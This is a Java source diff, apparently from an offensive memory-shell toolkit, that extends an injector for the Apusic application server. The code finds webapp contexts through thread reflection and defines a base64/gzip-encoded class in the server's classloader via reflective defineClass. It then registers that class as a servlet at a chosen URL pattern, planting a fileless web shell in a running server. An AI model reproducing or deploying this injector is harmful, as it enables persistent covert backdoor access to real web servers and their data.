@@ -3,10 +3,12 @@ package com.reajason.javaweb.memshell.injector.apusic;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
@@ -16,15 +18,22 @@ import java.util.zip.GZIPInputStream;
  */
 public class ApusicServletInjector {
 
+    String msg = "";
+
     public ApusicServletInjector() {
         try {
             List<Object> contexts = getContext();
+            msg += "contexts size: " + contexts.size() + "\n";
             for (Object context : contexts) {
-                Object servlet = getShell(context);
-                inject(context, servlet);
+                Object shell = getShell(context);
+                boolean inject = inject(context, shell);
+                msg += "context: " + getFieldValue(context, "contextRoot") +(inject ? " ok" : " already") + "\n";
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Throwable e) {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            PrintStream printStream = new PrintStream(outputStream);
+            e.printStackTrace(printStream);
+            msg += outputStream.toString();
         }
     }
 
@@ -45,44 +54,61 @@ public class ApusicServletInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("HouseKeeper")) {
-                contexts.add(getFieldValue(getFieldValue(thread, "this$0"), "container"));
+                // Apusic 9.0 SPX
+                Object sessionManager = getFieldValue(thread, "this$0");
+                contexts.add(getFieldValue(sessionManager, "container"));
+            } else if (thread.getName().contains("HTTPSession")) {
+                // Apusic 9.0.1
+                Object sessionManager = getFieldValue(thread, "this$0");
+                Map<?, ?> contextMap = ((Map<?, ?>) getFieldValue(getFieldValue(sessionManager, "vhost"), "contexts"));
+                contexts.addAll(contextMap.values());
             }
         }
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+    private Object getShell(Object context) throws Exception {
+        ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
         try {
-            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
-        } catch (Exception e) {
-            return ((ClassLoader) getFieldValue(context, "loader"));
+            defineShell(loader);
+            Object obj = loader.loadClass(getClassName()).newInstance();
+            msg += loader + " loaded \n";
+            return obj;
+        } catch (ClassNotFoundException e) {
+            // Apusic 9.0.1
+            ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
+            defineShell(internalLoader);
+            Object obj = loader.loadClass(getClassName()).newInstance();
+            msg += internalLoader + " loaded \n";
+            return obj;
         }
     }
 
     @SuppressWarnings("all")
-    private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = getWebAppClassLoader(context);
+    private void defineShell(ClassLoader classLoader) throws Exception {
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        } catch (Throwable ignored) {
         }
     }
 
-    public void inject(Object context, Object servlet) throws Exception {
+    public boolean inject(Object context, Object servlet) throws Exception {
         Object webModule = getFieldValue(context, "webapp");
         Object servletMapper = getFieldValue(context, "servletMapper");
         if (invokeMethod(webModule, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
-            System.out.println("servlet already injected");
-            return;
+            return false;
         }
         invokeMethod(webModule, "addServlet", new Class[]{String.class, String.class}, new Object[]{getClassName(), getClassName()});
         invokeMethod(servletMapper, "addMapping", new Class[]{String.class, boolean.class, String[].class}, new Object[]{getClassName(), true, new String[]{getUrlPattern()}});
-        System.out.println("servlet injected successful");
+        return true;
+    }
+
+    @Override
+    public String toString() {
+        return super.toString() + "\n" + msg;
     }
 
     @SuppressWarnings("all")
